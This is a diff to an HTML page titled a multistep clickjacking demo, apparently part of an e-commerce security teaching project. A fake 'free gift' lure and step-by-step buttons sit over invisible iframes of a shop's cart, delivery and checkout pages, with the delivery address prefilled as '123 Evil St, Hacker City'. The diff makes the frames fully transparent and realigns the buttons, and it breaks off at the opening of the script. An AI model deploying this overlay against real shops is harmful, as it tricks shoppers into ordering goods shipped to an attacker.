@@ -6,17 +6,19 @@
     <title>Multistep Clickjacking Demo</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gray-100 font-sans flex items-center justify-center min-h-screen">
-    <div class="container bg-white shadow-lg rounded-lg p-6 max-w-2xl text-center z-10">
-        <h1 class="text-3xl font-bold text-gray-800 mb-4">Claim Your Free Gift!</h1>
+<body class="bg-gray-100 font-sans flex flex-col items-center justify-center min-h-screen p-4">
+    <div class="bg-white shadow-lg rounded-lg p-6 max-w-2xl text-center z-10 mb-4">
+        <h1 class="text-3xl font-bold text-gray-800 mb-2">Claim Your Free Gift!</h1>
         <p class="text-lg text-gray-600">Click the buttons below to get your exclusive offer!</p>
     </div>
-    <iframe id="iframe-cart" class="block mx-auto w-[600px] h-[800px] opacity-0.5 z-10" src="https://security-in-e-commerce.onrender.com/cart" scrolling="no"></iframe>
-    <iframe id="iframe-delivery" class="hidden mx-auto w-[600px] h-[800px] opacity-0.5 z-10" src="https://security-in-e-commerce.onrender.com/delivery?address=123%20Evil%20St,%20Hacker%20City" scrolling="no"></iframe>
-    <iframe id="iframe-checkout" class="hidden mx-auto w-[600px] h-[800px] opacity-0.5 z-10" src="https://security-in-e-commerce.onrender.com/checkout" scrolling="no"></iframe>
-    <div class="firstClick fixed bottom-5 right-5 z-20 bg-red-500 text-white font-bold py-2 px-4 rounded-lg shadow-sm hover:bg-red-600 transition-colors cursor-pointer">Click me first</div>
+    <div class="relative w-[600px] h-[800px] z-0">
+        <iframe id="iframe-cart" class="absolute top-0 left-0 w-full h-full opacity-0 z-10" src="https://security-in-e-commerce.onrender.com/cart" scrolling="no"></iframe>
+        <iframe id="iframe-delivery" class="absolute top-0 left-0 w-full h-full opacity-0 z-10 hidden" src="https://security-in-e-commerce.onrender.com/delivery?address=123%20Evil%20St,%20Hacker%20City" scrolling="no"></iframe>
+        <iframe id="iframe-checkout" class="absolute top-0 left-0 w-full h-full opacity-0 z-10 hidden" src="https://security-in-e-commerce.onrender.com/checkout" scrolling="no"></iframe>
+    </div>
+    <div class="firstClick fixed bottom-15 right-50 z-20 bg-red-500 text-white font-bold py-2 px-4 rounded-lg shadow-sm hover:bg-red-600 transition-colors cursor-pointer">Click me first</div>
     <div class="secondClick hidden fixed top-[266px] left-[315px] z-20 bg-red-500 text-white font-bold py-2 px-4 rounded-lg shadow-sm hover:bg-red-600 transition-colors cursor-pointer">Click me next</div>
-    <div class="thirdClick hidden fixed bottom-5 right-5 z-20 bg-red-500 text-white font-bold py-2 px-4 rounded-lg shadow-sm hover:bg-red-600 transition-colors cursor-pointer">Click me last</div>
+    <div class="thirdClick hidden fixed bottom-15 right-50 z-20 bg-red-500 text-white font-bold py-2 px-4 rounded-lg shadow-sm hover:bg-red-600 transition-colors cursor-pointer">Click me last</div>
     <script>
         let currentStep = 'cart';
 
